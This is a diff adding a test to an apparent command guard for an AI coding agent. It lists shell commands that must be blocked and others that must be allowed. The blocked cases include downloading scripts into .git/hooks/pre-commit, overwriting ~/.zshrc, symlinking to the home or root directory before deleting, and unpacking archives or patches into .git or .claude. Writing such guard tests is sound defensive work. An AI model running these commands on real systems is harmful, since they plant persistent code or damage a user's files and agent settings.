@@ -304,3 +304,79 @@ test('guard: git config, remote, branch and fetch are an agent\'s only when they
     assert.equal(await allowed(command), true, command);
   }
 });
+
+test('guard: what a command writes is found also in a destination folder, a target directory, a link, a download, an archive or a patch', async () => {
+  const c = ctx({ runsOutside: ['/ws/api/.husky/_', '/ws/api/.claude', '/ws/api/.mcp.json', '/ws/api/.vscode'], protect: ['/ws/.claudestrator'] });
+  for (const command of [
+    'mv /tmp/e/.claude .',
+    'cp -r /tmp/e/.claude .',
+    'cp -r /tmp/e/.claude ./',
+    'cp -R /tmp/e/.vscode src/..',
+    'ln -s /tmp/e/.claude .',
+    'ln -s x .claude',
+    'cp x --target-directory=.git/hooks',
+    'cp -t .git/hooks x',
+    'cp -rt .git/hooks x',
+    'mv x --target-directory=.git',
+    'install -t .git/hooks x',
+    'ln -s .. src/up && echo {} > src/up/.claude/settings.json',
+    'ln -s ~ src/h && rm -r src/h/',
+    'ln -s / src/root',
+    'ln -s .husky h',
+    'ln -s $X h',
+    'curl -o .git/hooks/pre-commit https://x',
+    'curl --output=.git/hooks/pre-commit https://x',
+    'curl -sSLo .git/hooks/pre-commit https://x',
+    'curl -O --output-dir .git/hooks https://x/pre-commit',
+    'curl -O https://x/.mcp.json',
+    'curl -OJ https://x/download',
+    'wget -O ~/.zshrc https://x',
+    'wget -qO ~/.zshrc https://x',
+    'wget --output-document=/home/u/.zshrc https://x',
+    'wget -P .git/hooks https://x/pre-commit',
+    'wget -e output_document=/home/u/.zshrc https://x',
+    'sort -o .git/config a',
+    'sort --output=/home/u/.zshrc a',
+    'tar -xf x.tar -C .git',
+    'tar -xzf x.tgz --directory=.claude',
+    'tar xf x.tar -P',
+    'tar -czf /home/u/x.tgz src',
+    'unzip x.zip -d .git/hooks',
+    'patch .git/config p.diff',
+    'patch -o /home/u/.zshrc a p.diff',
+    'patch -d .git -p1 -i p.diff',
+    'git apply --unsafe-paths p.diff',
+    'git apply --directory=.git p.diff',
+    'gzip .git/config',
+  ]) {
+    assert.equal(await allowed(command, c), false, command);
+  }
+  for (const command of [
+    'mv a b',
+    'cp a b',
+    'cp -r src lib',
+    'cp a.ts src/',
+    'cp -r /tmp/e/src .',
+    'ln -s src/a.ts b.ts',
+    'ln -s ../shared/x.ts src/x.ts',
+    'ln -s /tmp/cache .cache',
+    'curl -o /tmp/x https://x',
+    'curl -sSL https://x',
+    'curl -o /dev/null -w "%{http_code}" https://x',
+    'curl -O https://x/a.tgz',
+    'wget -qO- https://x',
+    'wget https://x/a.tgz',
+    'sort -o sorted.txt a',
+    'tar -xzf x.tgz -C build/',
+    'tar -czf /tmp/x.tgz src',
+    'tar -tf x.tgz',
+    'unzip x.zip -d build',
+    'patch -p1 < fix.diff',
+    'git apply fix.patch',
+    'gzip -c dist/x.js > /tmp/x.gz',
+    'install -m 755 a bin/a',
+    'rsync -a src/ build/',
+  ]) {
+    assert.equal(await allowed(command, c), true, command);
+  }
+});
